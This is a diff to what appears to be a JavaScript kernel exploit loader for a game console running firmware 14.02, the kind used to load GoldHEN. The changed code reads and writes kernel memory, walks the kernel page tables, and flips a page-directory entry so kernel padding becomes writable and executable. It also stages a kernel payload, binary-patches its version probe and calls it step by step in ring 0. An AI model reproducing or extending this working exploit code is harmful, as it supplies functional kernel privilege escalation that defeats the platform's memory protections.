@@ -134,6 +134,12 @@ function say(fmt) {
   } catch (e) {}
 }
 
+/* A fulfilled promise does not hand the frame back to the compositor; a timer
+   does. Without one the whole ring 0 stretch paints as a single line. */
+function nap(ms) {
+  return new Promise(function (ok) { setTimeout(ok, ms || 350); });
+}
+
 const LOW = 0x100000000;
 
 function v(low, hi) { return new int64(low >>> 0, (hi || 0) >>> 0); }
@@ -837,9 +843,11 @@ async function runPatchSet(room) {
   }
   wrbuf(plus(room, 0xc0), pset);
   say("[g] patchset.bin loaded " + pset.length + " bytes -- calling gate");
+  await nap(400);
   const pr = c.callAddr(plus(room, GATE), [11, plus(room, 0xc0)]);
   say("[g] [0] kernel patch set, " + pset.length + " bytes from the libc tail -> 0x"
       + ((pr && pr.lo >>> 0) || 0).toString(16));
+  await nap(400);
   return true;
 }
 
@@ -1109,7 +1117,7 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
   say("[p] ---> calling runPatchSet");
   if (!(await runPatchSet(room))) return false;
   say("[p] patchset ok ---> calling paddingRW");
-  if (!paddingRW(k, kbase)) { say("[p] stopping: padding would stay read only"); return false; }
+  if (!(await paddingRW(k, kbase))) { say("[p] stopping: padding would stay read only"); return false; }
 
   /* whole loader image (loader + zlib + trailer) into the padding, PIC */
   tram.n = 0;
@@ -1210,7 +1218,11 @@ async function loadKpayloadSteps(k, kbase, room) {
     for (let j = 0; j < 4; j++) hi |= (blob[o + 4 + j] || 0) << (8 * j);
     c.p.write8(plus(data, o), v(lo >>> 0, hi >>> 0));
   }
-  say("[kp] kpayload staged at " + text(data));
+  /* A loader maps memsz-filesz as zero-filled .bss. The flat copy leaves the
+     section-name table sitting in it, and patch group 1 dereferences those
+     words as pointers. Everything past the last loadable byte goes to zero. */
+  for (let o = 0x98380; o < blob.length; o += 8) c.p.write8(plus(data, o), v(0, 0));
+  say("[kp] kpayload staged at " + text(data) + ", .bss cleared");
 
   const t = plus(kbase, GH.rvaPad);
   const tram = { n: 0 };
@@ -1227,9 +1239,42 @@ async function loadKpayloadSteps(k, kbase, room) {
   const saySync = function (m) { try { const x = new XMLHttpRequest(); x.open("GET", "ag_log?m=" + encodeURIComponent(m), false); x.send(); } catch (e) {} };
 
   say("[kp] kernel base " + text(kbase) + ", padding " + text(t));
+  await nap(400);
   if (!(await runPatchSet(room))) return false;
-  const dmapPad = paddingRW(k, kbase);
-  if (!dmapPad) { say("[kp] stopping: padding setup failed"); return false; }
+  say("[kp] patch set call returned");
+  await nap(400);
+  const dmapPad = await paddingRW(k, kbase);
+  if (!dmapPad) { say("[kp] stopping: padding setup failed"); await nap(400); return false; }
+
+  /* The payload's version probe scans [base+0x1300000, base+0x2200000) one
+     byte at a time in ring 0. That window starts in the hole between the
+     RELRO and RW segments here, and one read of an unmapped byte is a panic
+     with no signal. Plant the string it hunts for in the padding that was
+     just made RW+X and aim its window at that page instead. */
+  const scanAt = plus(t, 0x100000);
+  const verStr = unhex("732f72656c656173655f31342e303200");
+  if (!k.write(scanAt, verStr) || !sameBytes(k.read(scanAt, verStr.length) || new Uint8Array(0), verStr)) {
+    say("[kp] could not plant the version string at " + text(scanAt));
+    await nap(400);
+    return false;
+  }
+  const scanPatch = [
+    [0x115f5, "488d9000003001", "488d9000f01f01"],
+    [0x115fc, "480500002002",   "480510f01f01"],
+  ];
+  let probeMoved = true;
+  for (let i = 0; i < scanPatch.length; i++) {
+    if (!sameBytes(rdbuf(plus(data, scanPatch[i][0]), scanPatch[i][1].length / 2), unhex(scanPatch[i][1]))) {
+      probeMoved = false;
+    }
+  }
+  if (probeMoved) {
+    for (let i = 0; i < scanPatch.length; i++) wrbuf(plus(data, scanPatch[i][0]), unhex(scanPatch[i][2]));
+  }
+  say(probeMoved
+      ? "[kp] version probe aimed at " + text(scanAt)
+      : "[kp] version probe left as built -- the scan window may be unmapped");
+  await nap(400);
 
   const callAbsAt = function (base, rva) { hex("48b8"); q64(plus(base, rva)); hex("ffd0"); };
   const magic = c.p.read4(data);
@@ -1253,6 +1298,7 @@ async function loadKpayloadSteps(k, kbase, room) {
     hex("48b9"); q64(stepStack); hex("488b21");   /* rsp = [stepStack] */
     wpOn(); hex("31c0"); hex("c3");
     say("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (stack " + text(stepStack) + ")");
+    await nap(400);
     fire();
     const mk = markRead();
     if (mk[1] === 0xDEADBEEF) {
@@ -1263,10 +1309,27 @@ async function loadKpayloadSteps(k, kbase, room) {
     let rc = mk[0];
     if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
     say("[kp] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc + " -- " + what);
-    if (n === 0 && rc !== 0) {
-      say("[kp] init failed -- stopping before a bad call");
-      return false;
+    if (n === 0) {
+      const ver = rd4(plus(data, 0x98488)) & 0xffff;
+      const p0 = rd8(plus(data, 0x984e0));
+      say("[kp] payload reports version 0x" + ver.toString(16) + ", table word " + text(p0));
+      if (ver !== 0x57a) {
+        say("[kp] the payload did not find 14.02 -- stopping before a bad call");
+        await nap(400);
+        return false;
+      }
+      if (!p0 || !inText(p0)) {
+        say("[kp] the payload's kernel table is empty -- stopping");
+        await nap(400);
+        return false;
+      }
+      if (rc !== 0) {
+        say("[kp] init failed -- stopping before a bad call");
+        await nap(400);
+        return false;
+      }
     }
+    await nap(400);
   }
   say("[kp] kpayload patch chain finished, " + silent + " silent");
   return silent === 0;
@@ -1327,19 +1390,19 @@ const PT = {
   padFrom: 0x10ff000, padTo: 0x11ff000,
 };
 
-function paddingRW(k, kbase) {
+async function paddingRW(k, kbase) {
   const rd = function (a2) { return k.read_v(a2); };
   const kat = function (rva) { return plus(kbase, rva); };
 
   const g1 = rd(kat(PT.g1)), g2 = rd(kat(PT.g2));
-  if (!g1 || !g2) { say("[rw] the dmap dwords are not readable"); return null; }
+  if (!g1 || !g2) { say("[rw] the dmap dwords are not readable"); await nap(300); return null; }
   /* DMAP = 0xffff800000000000 | (g1 << 39) | (g2 << 30) */
   const a1 = g1.low >>> 0, a2v = g2.low >>> 0;
   const dmap = v(((a2v & 3) * 0x40000000) >>> 0,
                  (0xffff8000 | ((a1 << 7) >>> 0) | (a2v >>> 2)) >>> 0);
 
   const kph = rd(kat(PT.kphys));
-  if (!kph) { say("[rw] KPML4phys not readable"); return null; }
+  if (!kph) { say("[rw] KPML4phys not readable"); await nap(300); return null; }
   /* the page directory root, as a kernel address through the direct map */
   const p4 = v((dmap.low + kph.low) >>> 0,
                (dmap.hi + kph.hi + (((dmap.low >>> 0) + (kph.low >>> 0) > 0xffffffff) ? 1 : 0)) >>> 0);
@@ -1348,9 +1411,11 @@ function paddingRW(k, kbase) {
   if (!pm || !same(pm, p4)) {
     say("[rw] kernel_pmap->pm_pml4 is " + (pm ? text(pm) : "unreadable")
         + ", the calculation says " + text(p4) + " -- nothing written");
+    await nap(300);
     return null;
   }
   say("[rw] dmap " + text(dmap) + ", pml4 " + text(p4) + " confirmed against kernel_pmap");
+  await nap(300);
 
   /* one entry per level, by index out of the virtual address */
   const target = kat(PT.padFrom);
@@ -1365,20 +1430,21 @@ function paddingRW(k, kbase) {
   };
 
   const e4 = rd(plus(p4, i4 * 8));
-  if (!e4 || (e4.low & 1) === 0) { say("[rw] pml4 entry " + i4 + " not present"); return null; }
+  if (!e4 || (e4.low & 1) === 0) { say("[rw] pml4 entry " + i4 + " not present"); await nap(300); return null; }
   const e3at = plus(viaDmap(e4), i3 * 8);
   const e3 = rd(e3at);
-  if (!e3 || (e3.low & 1) === 0) { say("[rw] pdp entry " + i3 + " not present"); return null; }
-  if ((e3.low & 0x80) !== 0) { say("[rw] the pdp entry is a 1 GiB page -- not handled"); return null; }
+  if (!e3 || (e3.low & 1) === 0) { say("[rw] pdp entry " + i3 + " not present"); await nap(300); return null; }
+  if ((e3.low & 0x80) !== 0) { say("[rw] the pdp entry is a 1 GiB page -- not handled"); await nap(300); return null; }
   const e2at = plus(viaDmap(e3), i2 * 8);
   const e2 = rd(e2at);
-  if (!e2 || (e2.low & 1) === 0) { say("[rw] pd entry " + i2 + " not present"); return null; }
+  if (!e2 || (e2.low & 1) === 0) { say("[rw] pd entry " + i2 + " not present"); await nap(300); return null; }
 
   const big = (e2.low & 0x80) !== 0;
-  if (!big) { say("[rw] the pd entry is not a large page -- the padding is split, not handled"); return null; }
+  if (!big) { say("[rw] the pd entry is not a large page -- the padding is split, not handled"); await nap(300); return null; }
   /* both ends of the padding have to sit inside this one 2 MiB page */
   if (((PT.padFrom >>> 21) !== (PT.padTo >>> 21))) {
     say("[rw] the padding crosses a 2 MiB boundary -- one entry is not enough");
+    await nap(300);
     return null;
   }
   const needRW = (e2.low & 2) === 0;
@@ -1390,17 +1456,20 @@ function paddingRW(k, kbase) {
   const sumLo   = (dmap.low + pPhysLo + pOff) >>> 0;
   const carry   = (((dmap.low >>> 0) + pPhysLo + pOff) > 0xFFFFFFFF) ? 1 : 0;
   const dmapPad = v(sumLo, (dmap.hi + pPhysHi + carry) >>> 0);
-  if (!needRW && !needNX) { say("[rw] the padding already carries RW+X, dmap " + text(dmapPad)); return dmapPad; }
+  if (!needRW && !needNX) { say("[rw] the padding already carries RW+X, dmap " + text(dmapPad)); await nap(300); return dmapPad; }
   if (!needRW && needNX) { say("[rw] padding has RW but NX set -- clearing NX"); }
 
   const newLo = (e2.low | 2) >>> 0;
   const newHi = (e2.hi & 0x7fffffff) >>> 0;
+  say("[rw] writing the pd entry at " + text(e2at) + ", " + (e2.low >>> 0).toString(16) + " -> " + newLo.toString(16));
+  await nap(300);
   if (!k.write_v(e2at, v(newLo, newHi))) {
-    say("[rw] the page directory entry is not writable"); return null;
+    say("[rw] the page directory entry is not writable"); await nap(300); return null;
   }
   const back = rd(e2at);
-  if (!back || (back.low & 2) === 0) { say("[rw] the RW bit did not stick"); return null; }
+  if (!back || (back.low & 2) === 0) { say("[rw] the RW bit did not stick"); await nap(300); return null; }
   say("[rw] RW+X set on the pd entry at " + text(e2at) + ", dmap " + text(dmapPad));
+  await nap(300);
   return dmapPad;
 }
 
@@ -1522,7 +1591,7 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
   say("[g] kernel base " + text(kb) + " (from the exploit), padding " + text(t));
 
   /* before a single byte of GoldHEN goes into the padding */
-  if (!paddingRW(k, kb)) { say("[g] stopping: the padding would stay read only"); return false; }
+  if (!(await paddingRW(k, kb))) { say("[g] stopping: the padding would stay read only"); return false; }
 
   /* the payload goes into the kernel's padding, not into a thread */
   tram.n = 0;
